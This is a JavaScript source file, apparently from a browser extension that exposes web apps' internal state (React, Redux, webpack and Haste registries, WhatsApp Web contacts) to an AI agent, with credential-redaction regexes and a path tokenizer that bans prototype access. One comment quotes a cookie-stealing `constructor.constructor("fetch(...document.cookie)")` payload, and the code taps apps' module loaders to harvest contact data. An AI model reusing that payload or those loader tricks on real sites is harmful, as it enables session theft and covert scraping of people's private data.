  // --- THE LAYER UNDER THE DOM: an app's own state, read as DATA ---------------------------
  //
  // WHY THIS EXISTS, MEASURED: a selector-pinned `list_extract` on web.whatsapp.com's chat list
  // came back with 67 rows, and a phone number for UNSAVED contacts only. Neither figure is a
  // fault in the row engine. 67 is the MOUNTED VIRTUALIZATION WINDOW — the rail recycles its
  // rows, so the DOM is a viewport onto a list and never the list — and a saved contact's number
  // is not in the chat-list markup AT ALL: the app has a name for that person, so it renders the
  // name. The number exists one layer down, in the store the app renders FROM.
  //
  // Reading the DOM harder cannot fix either number, because neither answer is in the DOM to be
  // read. And that is the general case, not a WhatsApp case — every recycler is shaped this way.
  //
  // TWO VERBS, AND NEITHER TAKES CODE. `bridge-ops.js` carries the reasoning: MV3 forbids
  // remotely-hosted code, so a tool that accepted a JS expression off the socket would be a Web
  // Store rejection AND would hand arbitrary execution inside a signed-in browser to whatever a
  // poisoned page talked the agent into. So the vocabulary is:
  //
  //   discovery   the ENGINE says what state exists and where. The caller chooses nothing.
  //   read        the caller names a DATA PATH, tokenized here and walked as properties.
  //
  // A property walk is not evaluation: `a.b[0].c` is three lookups. It only stops being three
  // lookups if a path can reach a function and CALL it — which is why `constructor`, `__proto__`
  // and `prototype` are refused as steps (`x.constructor.constructor` IS `Function`, i.e. `eval`
  // wearing a hat) and why the only functions ever called are zero-argument accessors whose NAME
  // is on a closed list in this file or in a provider descriptor. Never a name off the socket.
  //
  // GENERIC MECHANISM, PER-APP DESCRIPTOR — the same split as the rest of the engine. Nothing
  // below branches on a hostname: discovery finds bootstrap globals, framework hooks and webpack
  // registries by shape, and where an app hides its store somewhere only that app knows about,
  // the knowledge is a `state` block in `providers.js` (see the WhatsApp entry) rather than a
  // line of code here.
  const STATE_DEPTH = 3;          // how far down a read goes by default
  const STATE_DEPTH_MAX = 6;      // ...and the most a caller may ask for
  const STATE_WIDE = 25;          // entries per array/object by default
  const STATE_WIDE_MAX = 200;
  const STATE_STR = 300;          // characters per string
  const STATE_NODES = 4000;       // values in one whole reply, cycles and all
  const STATE_SHAPE_DEPTH = 2;    // discovery summaries are deliberately shallower than a read
  const STATE_SHAPE_WIDE = 12;

  // CREDENTIALS NEVER LEAVE, AND THIS IS THE PRODUCT'S WHOLE POSITION — see the tier table in
  // DEEP-EXTRACTION.md. Page DATA rides the consent the person gave by pairing: they can
  // see it on their own screen. A session cookie or a bearer token is not page data. It is the
  // person's identity, usable from any machine, and handing one to an agent is precisely the
  // competitor-malware pattern this product exists to be the opposite of. An app store keeps
  // both in the same object graph, so the filter lives HERE, on the way out, where every reply —
  // discovery summary and path read alike — has to pass through it.
  //
  // DELIBERATELY OVER-BROAD. `/auth/` matches `author`, so a blog's state comes back with its
  // author redacted; a key called `authorizedUsers` loses its whole subtree. That is the failure
  // we want: over-redaction is a nuisance the agent can see and ask about, a leaked refresh token
  // is not recoverable. For the same reason every drop is REPORTED as a redaction rather than
  // quietly omitted — the agent must be able to tell "there was nothing there" from "there was
  // something and you may not have it".
  const SECRET_KEY = /token|auth|secret|password|cookie|jwt|bearer|apikey|api_key|credential|privkey|private_?key|session_?id/i;
  // A JWT is three base64url segments with dots between them, and it is the single most
  // recognisable credential on the web.
  const JWT_SHAPE = /^[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{6,}$/;
  const HEX_BLOB = /^[0-9a-fA-F]{32,}$/;
  // A LONG BLOB IS ONLY A SECRET IF IT LOOKS RANDOM, and the tuning matters in both directions.
  // Length alone redacts every CDN path and product id on the page; so the test is one alphabet
  // with no dots or spaces (a URL and a sentence both fail that), all three character classes
  // present, and a high ratio of distinct characters — which a repetitive path like
  // `/a/bb/ccc/dddd` fails and a 40-character API key passes.
  const looksRandom = (s) => {
    if (s.length < RANDOM_MIN_LEN || !/^[A-Za-z0-9+/_=-]+$/.test(s)) return false;
    const kinds = (/[a-z]/.test(s) ? 1 : 0) + (/[A-Z]/.test(s) ? 1 : 0) + (/[0-9]/.test(s) ? 1 : 0);
    if (kinds < 3) return false;
    let uniq = 0;
    const seen = Object.create(null);
    for (const ch of s) if (!seen[ch]) { seen[ch] = 1; uniq++; }
    return uniq / Math.min(s.length, RANDOM_SAMPLE) >= RANDOM_DISTINCT;
  };
  const secretValue = (s) => JWT_SHAPE.test(s) || HEX_BLOB.test(s) || looksRandom(s);

  // A CLOSED LIST OF ZERO-ARGUMENT READERS. Every name here is a convention whose whole job is to
  // hand back what the object already holds — `getState` is the Redux store's one documented
  // accessor, `getModelsArray` is the Backbone-style collection reader that every app built on
  // that pattern exposes, `toArray`/`toJSON` are the two serialisers with an agreed meaning.
  // Nothing is called with arguments and nothing whose name is not on this list (or on a
  // descriptor's `state.accessors`) is called at all — a name arriving off the socket would make
  // this a code-execution tool by the back door, which is the one thing it must never be.
  const STATE_ACCESSORS = ['getState', 'getModelsArray', 'toArray', 'toJSON'];

  // Steps a path may not take. The first three are the escape hatch: `constructor.constructor` is
  // the `Function` constructor, so a walk that allows them is `eval` with extra typing. The rest
  // are prototype plumbing that no app keeps data in.
  const STATE_BANNED = /^(__proto__|constructor|prototype|caller|arguments|__define(Getter|Setter)__|__lookup(Getter|Setter)__)$/;

  const stateSpec = () => (PROVIDERS[mapKind()] || {}).state || null;
  const stateAccessorOk = (name) => {
    if (STATE_ACCESSORS.indexOf(name) >= 0) return true;
    const spec = stateSpec();
    const extra = (spec && spec.accessors) || (spec && spec.webpack && spec.webpack.accessors) || [];
    return extra.indexOf(name) >= 0;
  };

  // A key becomes a path fragment. Quoted whenever it is not a plain word, because a webpack
  // module id is routinely `./src/store/index.js` and a path the agent cannot paste back is a
  // path we did not really give them. An index stays an index: reporting `chats[0]` back as
  // `chats["0"]` still resolves, and still tells the caller their array is an object.
  const stateJoin = (prefix, key) => {
    const k = String(key);
    if (/^[A-Za-z_$][A-Za-z0-9_$]*$/.test(k)) return `${prefix}.${k}`;
    if (/^\d+$/.test(k)) return `${prefix}[${k}]`;
    return `${prefix}[${JSON.stringify(k)}]`;
  };

  const stateFn = (v) => {
    let name = '';
    try { name = String(v.name || ''); } catch (_) { name = ''; }
    return `[function${name ? ' ' + name.slice(0, 40) : ''}]`;
  };
  const stateNode = (v) => {
    let id = '';
    try { id = v.id ? '#' + String(v.id).slice(0, 40) : ''; } catch (_) { id = ''; }
    let name = 'node';
    try { name = String(v.nodeName || 'node').toLowerCase(); } catch (_) {}
    return `[${name}${id}]`;
  };

  function stateCtx(op) {
    return {
      depth: Math.max(1, Math.min(STATE_DEPTH_MAX, Number(op && op.depth) || STATE_DEPTH)),
      wide: Math.max(1, Math.min(STATE_WIDE_MAX, Number(op && op.limit) || STATE_WIDE)),
      // The CURRENT PATH, not a set of everything seen. A seen-set reports a shared reference
      // as a cycle, which is a lie about a graph that is merely normalised; a stack reports
      // exactly the thing that would loop forever.
      stack: [],
      // Where in a collection to start. Paging exists because measuring what fits is only half an
      // answer: a caller told "33 of 10,066 fit" needs a way to ask for the next 33.
      from: Math.max(0, Number(op && op.offset) || 0),
      nodes: 0,
      redacted: 0,
      cut: false,
      // CARRIED, so every reader can honour it. `fields` was read in one place only, which is how
      // `@dom` came to advertise column trimming in its own REPLY_TOO_BIG advice and ignore it.
      fields: Array.isArray(op && op.fields) ? op.fields.filter(Boolean).map(String) : [],
    };
  }

  // Everything returned goes through here. Bounded four ways at once — depth, breadth, string
  // length and a whole-reply node budget — because the graph on the other side is an entire
  // application's memory and a tool that hangs or fills a context window is a tool nobody calls
  // twice.
  function stateValue(v, ctx, depth, wide, key) {
    // A TRUNCATION MARKER IN A DATA FIELD IS WORSE THAN A MISSING ROW.
    //
    // Measured: a chat export carried `saved_name: "[budget: the reply is full]"` — this sentence,
    // written for a human reading a reply, ended up in a CSV column as if it were somebody's name.
    // The array-level measurement upstream sizes the slice correctly, but a single item can still
    // exhaust what is left mid-way through its own fields, and the marker then reads exactly like a
    // value. `ctx.cut` is already set here; every caller that assembles rows can see it and drop the
    // partial item instead of shipping it. The marker keeps its shape for the human case, and
    // `ctx.cut` is what code is meant to check.
    if (ctx.nodes++ > STATE_NODES) { ctx.cut = true; return '[budget: the reply is full]'; }
    // THE KEY IS CHECKED BEFORE THE VALUE IS EVEN LOOKED AT, and it takes the whole subtree with
    // it. `{ auth: { user, pass } }` has a credential in it and `pass` matches no pattern of
    // ours, so descending under a credential-shaped key and filtering the children would leak
    // exactly the case the filter exists for.
    if (key != null && SECRET_KEY.test(String(key))) {
      ctx.redacted++;
      const kind = v === null ? 'null' : (Array.isArray(v) ? 'array' : typeof v);
      return `[redacted: credential-shaped key, held a ${kind}]`;
    }
    if (v === null || v === undefined) return null;
    const t = typeof v;
    if (t === 'string') {
      if (secretValue(v)) { ctx.redacted++; return '[redacted: token-shaped value]'; }
      return v.length > STATE_STR ? `${v.slice(0, STATE_STR)}… [+${v.length - STATE_STR} chars]` : v;
    }
    if (t === 'number' || t === 'boolean') return v;
    if (t === 'bigint') return `${String(v)}n`;
    if (t === 'symbol') return '[symbol]';
    if (t === 'function') return stateFn(v);

    // Cross-realm safe. `instanceof Date` is false for a Date made inside an iframe, and this
    // graph is full of values from other realms.
    let tag = '';
    try { tag = Object.prototype.toString.call(v); } catch (_) { tag = '[object Unknown]'; }
    if (tag === '[object Window]') return '[Window]';
    if (tag === '[object Document]' || tag === '[object HTMLDocument]') return '[Document]';
    try { if (v.nodeType && typeof v.nodeName === 'string') return stateNode(v); } catch (_) {}
    if (tag === '[object Date]') { try { return v.toISOString(); } catch (_) { return '[Date]'; } }
    if (tag === '[object RegExp]') { try { return `[regexp ${String(v).slice(0, 80)}]`; } catch (_) { return '[regexp]'; } }
    if (tag === '[object Error]') { try { return `[error ${String(v.message || '').slice(0, 120)}]`; } catch (_) { return '[error]'; } }
    if (tag === '[object Promise]') return '[promise]';
    if (tag === '[object ArrayBuffer]' || /^\[object (Int|Uint|Float|BigInt|BigUint|DataView)/.test(tag)) {
      let n = 0;
      try { n = v.byteLength || v.length || 0; } catch (_) {}
      return `[binary ${tag.slice(8, -1)} ${n} bytes]`;
    }

    if (ctx.stack.indexOf(v) >= 0) return '[cycle]';
    if (depth <= 0) {
      // Not nothing: the shape and the size, so the agent knows a longer path is worth asking for.
      if (Array.isArray(v)) { let n = 0; try { n = v.length; } catch (_) {} return `[array of ${n}, deeper than depth]`; }
      let n = 0;
      try { n = Object.keys(v).length; } catch (_) {}
      return `[object with ${n} keys, deeper than depth]`;
    }

    ctx.stack.push(v);
    try {
      if (tag === '[object Map]') {
        const out = { '[Map]': { size: (() => { try { return v.size; } catch (_) { return 0; } })() }, entries: {} };
        let n = 0;
        try {
          for (const [k, val] of v) {
            if (n++ >= wide) break;
            out.entries[String(k).slice(0, 80)] = stateValue(val, ctx, depth - 1, wide, k);
          }
        } catch (_) {}
        return out;
      }
      if (tag === '[object Set]') {
        const out = { '[Set]': { size: (() => { try { return v.size; } catch (_) { return 0; } })() }, values: [] };
        let n = 0;
        try {
          for (const val of v) {
            if (n++ >= wide) break;
            out.values.push(stateValue(val, ctx, depth - 1, wide, null));
          }
        } catch (_) {}
        return out;
      }
      if (Array.isArray(v)) {
        let total = 0;
        try { total = v.length; } catch (_) {}
        const from = Math.max(0, Math.min(total, ctx.from || 0));
        // MEASURE BEFORE CONSUMING, RATHER THAN DISCOVERING THE CEILING BY HITTING IT.
        //
        // Asking for 200 of a 10,066-long collection used to serialize 33 of them and fill the rest
        // of the reply with `[budget: the reply is full]` — a reply that LOOKS like an answer and is
        // not one. The caller had no way to know 33 was the real number short of parsing the
        // placeholders back out.
        //
        // The first element is serialized against a throwaway counter to learn what ONE costs, and
        // the number that actually fits is then arithmetic. No per-app knowledge in it: cost is
        // measured on whatever this array happens to hold, so a collection of small strings still
        // returns thousands and a collection of 46-field models returns what 46-field models cost.
        const room = () => Math.max(0, STATE_NODES - ctx.nodes);
        let fits = Math.min(total - from, wide);
        let per = 0;
        if (fits > 1) {
          const probe = { ...ctx, nodes: 0, redacted: 0, stack: ctx.stack.slice(), cut: false };
          try { stateValue(v[from], probe, depth - 1, wide, null); } catch (_) {}
          per = Math.max(1, probe.nodes);
          fits = Math.max(1, Math.min(fits, Math.floor(room() / per)));
        }
        const items = [];
        for (let i = from; i < from + fits; i++) {
          let cell;
          try { cell = v[i]; } catch (e) { cell = `[threw: ${String(e && e.message).slice(0, 80)}]`; }
          if (typeof cell === 'string' && cell.startsWith('[threw:')) { items.push(cell); continue; }
          // WHOLE ITEMS OR NONE. An element serialized while the budget ran out comes back with the
          // truncation marker sitting where a value should be, and downstream that is indistinguish-
          // able from data — a chat export shipped `"[budget: the reply is full]"` as a contact's
          // name. Stop at the first incomplete element instead: the count already reported is then
          // honest, and `next` points at the element that did not fit.
          const before = ctx.cut;
          const one = stateValue(cell, ctx, depth - 1, wide, null);
          if (ctx.cut && !before) break;
          items.push(one);
        }
        // THE TRUE TOTAL, ALWAYS — the same promise `results_get` makes. A count that is really
        // "however many fitted" is how a walk of 600 gets reported as a list of 25. `next` is the
        // offset to ask for to continue, so paging needs no arithmetic from the caller, and
        // `perItem` says why `shown` is what it is instead of what was requested.
        if (total > items.length || from > 0) {
          const seen = from + items.length;
          const box = { '[array]': { total, shown: items.length, from }, items };
          if (per) box['[array]'].perItem = per;
          if (seen < total) box['[array]'].next = seen;
          return box;
        }
        return items;
      }
      let keys = [];
      try { keys = Object.keys(v); } catch (_) { keys = []; }
      const out = {};
      for (const k of keys.slice(0, wide)) {
        let cell;
        try { cell = v[k]; } catch (e) { out[k] = `[threw: ${String(e && e.message).slice(0, 80)}]`; continue; }
        out[k] = stateValue(cell, ctx, depth - 1, wide, k);
      }
      if (keys.length > wide) out['[more]'] = { keys: keys.length, shown: wide };
      return out;
    } finally {
      ctx.stack.pop();
    }
  }

  // AN EXPLICIT TOKENIZER, because the one-line alternative is the thing this file refuses to be.
  // `new Function('return ' + path)` reads `Contact.models[0].id` and also reads
  // `constructor.constructor("fetch('http://x/'+document.cookie)")()`, and there is no version of
  // "just evaluate it" that is only as powerful as a property walk. So: dots, `[0]`, and quoted
  // `["any key"]`, and every failure names the character it gave up at.
  function statePath(raw) {
    const s = String(raw == null ? '' : raw);
    const steps = [];
    let i = 0;
    while (i < s.length) {
      if (s[i] === '.') { i++; continue; }
      if (s[i] === '[') {
        const q = s[i + 1];
        if (q === '"' || q === "'") {
          const end = s.indexOf(q + ']', i + 2);
          if (end < 0) return { error: `no closing ${q}] after character ${i}` };
          steps.push(s.slice(i + 2, end));
          i = end + 2;
          continue;
        }
        const end = s.indexOf(']', i);
        if (end < 0) return { error: `no closing ] after character ${i}` };
        const inner = s.slice(i + 1, end).trim();
        if (!/^\d+$/.test(inner)) {
          return { error: `[${inner.slice(0, 40)}] is not an array index — quote it as ["${inner.slice(0, 40)}"] if it is a key` };
        }
        steps.push(inner);
        i = end + 1;
        continue;
      }
      let j = i;
      while (j < s.length && s[j] !== '.' && s[j] !== '[') j++;
      const word = s.slice(i, j).trim();
      if (!word) return { error: `an empty step at character ${i}` };
      steps.push(word);
      i = j;
    }
    if (!steps.length) return { error: 'the path is empty' };
    for (const t of steps) {
      if (STATE_BANNED.test(t)) {
        return { error: `"${t}" is not readable — a path may not reach a prototype or a constructor, `
          + 'because that is code execution wearing a data costume' };
      }
    }
    return { steps };
  }

  // WHICH GLOBALS BELONG TO THE APP? A hardcoded list of standard globals cannot be finished and
  // goes stale every Chrome release. A fresh same-origin frame HAS the standard list by
  // construction — whatever this `window` holds that a virgin `about:blank` window does not is
  // something the page put there. Same borrowed-frame trick as `pristineFetch`, and for the same
  // reason: the page's own realm is not a reliable place to ask what "standard" means.
  function stateAppGlobals() {
    let box = null;
    let base = null;
    try {
      box = document.createElement('iframe');
      box.setAttribute('aria-hidden', 'true');
      box.setAttribute('tabindex', '-1');
      box.style.cssText = 'position:fixed;left:-9999px;top:0;width:0;height:0;opacity:0;'
        + 'pointer-events:none;border:0';
      (document.body || document.documentElement).appendChild(box);
      const w = box.contentWindow;
      if (w) base = new Set(Object.keys(w));
    } catch (_) { base = null; }
    if (box) { try { box.remove(); } catch (_) {} }
    let mine = [];
    try { mine = Object.keys(window); } catch (_) { mine = []; }
    if (!base) {
      // CSP can refuse the frame. Then the well-known list below is all we have, and saying so
      // is better than reporting an empty discovery as if the page had no state.
      return { names: [], via: 'unavailable (no frame — CSP?)' };
    }
    return { names: mine.filter((k) => !base.has(k)), via: 'window keys minus a fresh frame\'s' };
  }

  // --- webpack module registries -------------------------------------------------------------
  // THE IMPORTANT GENERAL CASE. Plenty of modern apps keep nothing on `window` at all: the store
  // lives inside a webpack module, reachable only through the app's own module registry. WhatsApp
  // Web is one of them, and so is a large share of everything else built since 2020.
  const STATE_REQ = '__holoscrapeReq';
  const STATE_CHUNK = /^webpackChunk|^webpackJsonp$/;

  function stateChunkNames(own) {
    const out = [];
    for (const n of own) if (STATE_CHUNK.test(n)) out.push(n);
    // A descriptor may name one the pattern misses — an app is free to call its chunk global
    // anything, and that is a per-app FACT, so it belongs in the descriptor and not in this
    // pattern. Same door `listNames` uses.
    const spec = stateSpec();
    const named = spec && spec.webpack && spec.webpack.chunk;
    if (named && out.indexOf(named) < 0) {
      let there = false;
      try { there = !!window[named]; } catch (_) { there = false; }
      if (there) out.push(named);
    }
    return out;
  }

  // THE APP HANDS OVER ITS OWN LOADER. Pushing a chunk is what every one of this app's script
  // files does on arrival; webpack's `webpackJsonpCallback` answers by calling the third element
  // with `__webpack_require__`. Nothing runs that the app did not write, and the push happens ONCE
  // per page (cached on window) because a probe chunk id registered twice is twice the chance of
  // confusing a loader that later wants that id.
  function stateRequire(names) {
    try { if (window[STATE_REQ] && window[STATE_REQ].req) return window[STATE_REQ]; } catch (_) {}
    for (const name of names) {
      let arr = null;
      try { arr = window[name]; } catch (_) { arr = null; }
      if (!arr || typeof arr.push !== 'function') continue;
      let req = null;
      try { arr.push([['holoscrape:probe'], {}, (r) => { req = r; }]); } catch (_) { req = null; }
      if (req) {
        try { window[STATE_REQ] = { req, chunk: name }; } catch (_) { return { req, chunk: name }; }
        return window[STATE_REQ];
      }
    }
    return null;
  }

  // A SECOND MODULE SYSTEM, BECAUSE WEBPACK IS NOT THE ONLY ONE.
  //
  // Measured on web.whatsapp.com: the chunk global `webpackChunkwhatsapp_web_client` EXISTS, the
  // probe push above succeeds, and the registry comes back holding zero modules — because Meta's
  // apps register through their own Haste loader, not webpack's. The tell is sitting in plain sight
  // in discovery's own output: `__d`, `require`, `requireLazy`, `importDefault`, `importNamespace`
  // are all page globals. The webpack array is a shell; `__d(id, factory)` is where the modules go.
  //
  // `require(id)` on an ALREADY-REGISTERED module returns its exports. It can instantiate one that
  // has not run yet, which is why this only ever asks for ids a DESCRIPTOR named: a fixed, reviewed
  // list of stores the UI is already rendering from, never a sweep of everything registered and
  // never an id an agent supplied. Same rule as everywhere else here — the mechanism is generic,
  // the per-app knowledge is data.
  function stateHaste(spec) {
    const want = (spec && spec.haste && spec.haste.want) || [];
    if (!want.length) return null;
    let req = null;
    try { req = typeof window.require === 'function' ? window.require : null; } catch (_) { req = null; }
    if (!req) return { bag: null, why: 'this page has no Haste require()' };
    const bag = {};
    let n = 0;
    for (const id of want) {
      try { const m = req(id); if (m) { bag[id] = m; n++; } } catch (_) {}
    }
    return { chunk: 'haste:require', bag, modules: n };
  }

  // ONLY MODULES THE APP HAS ALREADY LOADED. `req.m` holds every module FACTORY, and calling one
  // runs code the person did not ask to run with whatever side effects its author put in it;
  // `req.c` holds the exports of modules already instantiated, and reading it is a property read.
  // It is also sufficient — a store the UI is rendering from is loaded by definition.
  //
  // Falls through to the Haste loader when webpack yields nothing, so `@mod[...]` means "this app's
  // module registry" regardless of which system the app happens to use.
  function stateModules(own) {
    const got = stateRequire(stateChunkNames(own));
    const haste = () => stateHaste(stateSpec());
    if (!got) return haste();
    let cache = null;
    try { cache = got.req.c || got.req.cache || null; } catch (_) { cache = null; }
    if (!cache) return haste() || { chunk: got.chunk, bag: null, why: 'the registry exposes no module cache' };
    const bag = {};
    let n = 0;
    try {
      for (const id of Object.keys(cache)) {
        try { const m = cache[id]; if (m && m.exports) { bag[id] = m.exports; n++; } } catch (_) {}
      }
    } catch (_) {}
    // An empty webpack registry is exactly what a Haste app looks like from here, so it is not an
    // answer — it is a reason to ask the other loader.
    if (!n) return haste() || { chunk: got.chunk, bag, modules: 0 };
    return { chunk: got.chunk, bag, modules: n };
  }

  // --- framework roots -----------------------------------------------------------------------
  // Read-only, depth-capped, and found by SHAPE. React 18 parks the host-root fiber on the
  // container element under a `__reactContainer$<random>` key; 16/17 used `_reactRootContainer`.
  // Both are expandos on an element near the top of the body, which is why the search is bounded
  // to the body and its children rather than sweeping the document.
  function stateReactRoots() {
    const out = [];
    const look = [document.documentElement, document.body]
      .concat(document.body ? [...document.body.children] : []).slice(0, ROOT_SCAN_NODES);
    for (const el of look) {
      if (!el || out.length >= ROOTS_MAX) continue;
      let keys = [];
      try { keys = Object.keys(el); } catch (_) { keys = []; }
      const k = keys.find((x) => /^__reactContainer\$/.test(x));
      if (k) {
        try { out.push({ node: el[k], via: 'element.__reactContainer$… (React 18)' }); } catch (_) {}
        continue;
      }
      try {
        const legacy = el._reactRootContainer;
        if (legacy) {
          const fiber = (legacy._internalRoot && legacy._internalRoot.current) || legacy.current || legacy;
          out.push({ node: fiber, via: 'element._reactRootContainer (React 16/17)' });
        }
      } catch (_) {}
    }
    return out;
  }

  function stateVueApps() {
    const out = [];
    try {
      const apps = window.__VUE_DEVTOOLS_GLOBAL_HOOK__ && window.__VUE_DEVTOOLS_GLOBAL_HOOK__.apps;
      if (Array.isArray(apps)) for (const a of apps.slice(0, 4)) out.push({ node: a, via: 'devtools hook apps[] (Vue 3)' });
    } catch (_) {}
    if (!out.length) {
      const look = [document.body].concat(document.body ? [...document.body.children] : []).slice(0, VUE_SCAN_NODES);
      for (const el of look) {
        try {
          if (el && el.__vue_app__) { out.push({ node: el.__vue_app__, via: 'element.__vue_app__ (Vue 3)' }); break; }
          if (el && el.__vue__) { out.push({ node: el.__vue__, via: 'element.__vue__ (Vue 2)' }); break; }
        } catch (_) {}
      }
    }
    return out;
  }

  // A STORE IS A SHAPE, NOT A NAME. `window.__REDUX_DEVTOOLS_EXTENSION__` is a hook the devtools
  // extension installs, and it hands out no store by itself — measured claims to the contrary are
  // what this comment exists to stop. What CAN be recognised is the store's own interface:
  // getState + dispatch + subscribe, which every Redux store and most of its imitators expose.
  // One level deep only, over the app's own globals — walking further would mean touching every
  // property of every object on the page.
  function stateStores(own) {
    const out = [];
    const names = own.slice(0, STORE_SCAN_GLOBALS)
      .concat(['store', '_store', '__store', 'reduxStore', '__REDUX_STORE__']);
    const seen = Object.create(null);
    for (const n of names) {
      if (seen[n] || out.length >= ROOTS_MAX) continue;
      seen[n] = 1;
      let v = null;
      try { v = window[n]; } catch (_) { continue; }
      if (!v || typeof v !== 'object') continue;
      try {
        if (typeof v.getState === 'function' && typeof v.dispatch === 'function'
          && typeof v.subscribe === 'function') out.push({ name: n, store: v });
      } catch (_) {}
    }
    return out;
  }

  // THE ROOTS A PATH MAY START AT, and this table is closed. Anything else is read as a property
  // of `window`, which is what `__NEXT_DATA__.props` means. The `@` names exist because a React
  // fiber and a webpack module are not reachable from `window` by any dotted path — they hang off
  // an element expando and off the app's own registry — so discovery hands out a prefix that IS
  // resolvable instead of a description of where to look.
  function stateRoot(name, own) {
    if (name === 'window') return { node: window, label: 'window' };
    if (name === '@react') {
      const bag = {};
      stateReactRoots().forEach((r, i) => { bag[i] = r.node; });
      return { node: bag, label: 'React fiber roots' };
    }
    if (name === '@vue') {
      const bag = {};
      stateVueApps().forEach((r, i) => { bag[i] = r.node; });
      return { node: bag, label: 'Vue apps' };
    }
    if (name === '@stores') {
      const bag = {};
      stateStores(own).forEach((r, i) => { bag[i] = r.store; });
      return { node: bag, label: 'store-shaped globals' };
    }
    if (name === '@mod') {
      const mods = stateModules(own);
      return { node: (mods && mods.bag) || null, label: 'webpack module cache',
        why: mods ? mods.why : 'no webpack registry on this page' };
    }
    return null;
  }
  const STATE_ROOT_NAMES = ['window', '@react', '@vue', '@stores', '@mod'];

  // The well-known bootstrap globals, by name. The frame diff above finds these too — this list
  // is what lets discovery SAY WHAT ONE IS when it sees it, and the fallback when CSP refuses the
  // frame. Paths with dots in them are walked like any other path; nothing here is called.
  const STATE_WELL_KNOWN = [
    ['__INITIAL_STATE__', 'a server-rendered bootstrap store'],
    ['__PRELOADED_STATE__', 'a Redux preloaded state'],
    ['__NEXT_DATA__', "Next.js's page payload"],
    ['__NEXT_F', "Next.js App Router flight data"],
    ['__NUXT__', 'a Nuxt 2 payload'],
    ['__NUXT_DATA__', 'a Nuxt 3 payload'],
    ['__remixContext', 'Remix route data'],
    ['__staticRouterHydrationData', 'React Router hydration data'],
    ['__APOLLO_STATE__', 'an Apollo cache, already normalized'],
    ['__APOLLO_CLIENT__.cache.data.data', "the live Apollo cache's normalized store"],
    ['__RELAY_STORE__', 'a Relay record source'],
    ['__INITIAL_DATA__', 'a bootstrap payload'],
    ['initialState', 'a bootstrap store — 2GIS names its own this'],
    ['INITIAL_STATE', 'a bootstrap store'],
    ['__STATE__', 'a bootstrap store'],
    ['__data', 'a bootstrap payload'],
    ['_sharedData', 'an Instagram-style bootstrap payload'],
    ['__PWS_INITIAL_PROPS__', 'a Pinterest-style bootstrap payload'],
    ['dataLayer', 'the Google Tag Manager queue — page facts the app pushed'],
    ['__VUE_DEVTOOLS_GLOBAL_HOOK__.apps', "the Vue devtools hook's app list"],
  ];

  // Walk a path over the object graph. Returns `{ node, walked, called }`, or an error naming
  // where it broke.
  // NEVER A SILENT NULL: a path that misses says which step missed and what was actually there,
  // because "null" is indistinguishable from "the field is empty" and sends an agent round the
  // same wrong loop twice.
  function stateWalk(steps, own) {
    const head = steps[0];
    const known = STATE_ROOT_NAMES.indexOf(head) >= 0;
    const root = stateRoot(known ? head : 'window', own);
    if (!root || root.node == null) {
      return { error: 'NO_ROOT', root: head,
        why: (root && root.why) || `there is no "${head}" to read on this page`,
        tell: 'call page_state with no path to see what this page offers' };
    }
    let node = root.node;
    let walked = known ? head : 'window';
    const called = [];
    for (let i = known ? 1 : 0; i < steps.length; i++) {
      const step = steps[i];
      const here = walked;
      if (node == null || (typeof node !== 'object' && typeof node !== 'function')) {
        return { error: 'NO_PATH', failedAt: step, reached: here,
          why: `${here} is ${node === null ? 'null' : typeof node}, so it has no "${step}"` };
      }
      let next;
      try { next = node[step]; } catch (e) {
        return { error: 'THREW', failedAt: step, reached: here,
          why: `reading "${step}" off ${here} threw: ${String(e && e.message).slice(0, 120)}` };
      }
      if (typeof next === 'function') {
        if (stateAccessorOk(step)) {
          // Zero arity, on its own object, and named by this file or a descriptor. Anything else
          // is reported as a function and left alone.
          try { next = next.call(node); called.push(step); } catch (e) {
            return { error: 'ACCESSOR_THREW', failedAt: step, reached: here,
              why: `${here}.${step}() threw: ${String(e && e.message).slice(0, 120)}` };
          }
        } else if (i === steps.length - 1) {
          // A function IS an answer when it is the last step — the agent learns it is there.
          next = stateFn(next);
        } else {
          return { error: 'NOT_DATA', failedAt: step, reached: here,
            why: `${here}.${step} is a function, and a path may not be walked THROUGH one — `
              + 'only a named zero-argument accessor is ever called, and this is not one',
            accessors: STATE_ACCESSORS.slice() };
        }
      }
      if (next === undefined) {
        let there = false;
        let keys = [];
        try { there = step in node; } catch (_) {}
        try { keys = Array.isArray(node) ? [] : Object.keys(node).slice(0, NO_PATH_KEYS); } catch (_) {}
        return {
          error: 'NO_PATH', failedAt: step, reached: here,
          why: there ? `${here}.${step} exists and is undefined`
            : `${here} has no "${step}"`,
          has: Array.isArray(node) ? { array: (() => { try { return node.length; } catch (_) { return 0; } })() } : keys,
          tell: 'call page_state with no path to see what this page offers',
        };
      }
      node = next;
      walked = stateJoin(walked, step);
      if (typeof node === 'string') {
        // A called accessor or a string leaf mid-path: stop rather than index into characters,
        // which is a walk that always "works" and always says nothing.
        if (i < steps.length - 1) {
          return { error: 'NO_PATH', failedAt: steps[i + 1], reached: walked,
            why: `${walked} is a string — there is nothing under it` };
        }
      }
    }
    return { node, walked, called };
  }

  // --- discovery ------------------------------------------------------------------------------
  // WHAT EXISTS, AND THE PREFIX TO READ IT WITH. Discovery exists because the alternative is an
  // agent guessing at globals, and a guessing agent asks twenty times and gets twenty nulls.
  //
  // Be honest about what it is NOT: discovery does not gate the read — a caller may pass any path
  // without asking first. What bounds a read is the tokenizer (no code, no prototypes), the
  // accessor allowlist (no calling what we did not name), the pairing and restricted-host checks above it in
  // `bridge-ops.js`, and the redaction pass on the way out. Discovery is a MAP, not a lock.
  //
  // Shapes are deliberately shallower than a read (depth 2, 12 entries) — this is a menu, not
  // the meal.
  function stateDiscover(op) {
    const ctx = stateCtx(op);
    const own = stateAppGlobals();
    const sources = [];
    const claimed = Object.create(null);

    const shape = (v) => stateValue(v, ctx, STATE_SHAPE_DEPTH, STATE_SHAPE_WIDE, null);
    const add = (path, via, node, note) => {
      if (claimed[path]) return;
      claimed[path] = 1;
      let kind = node === null ? 'null' : (Array.isArray(node) ? 'array' : typeof node);
      let size = null;
      try { size = Array.isArray(node) ? node.length : (node && typeof node === 'object' ? Object.keys(node).length : null); } catch (_) {}
      sources.push({ path, via, kind, ...(size == null ? {} : { entries: size }),
        ...(note ? { note } : {}), shape: shape(node) });
    };

    // 1. the well-known bootstrap globals, named so the agent knows what it is looking at.
    for (const [path, via] of STATE_WELL_KNOWN) {
      const p = statePath(path);
      if (p.error) continue;
      const got = stateWalk(p.steps, own.names);
      if (got.error || got.node == null) continue;
      add(path, via, got.node);
    }

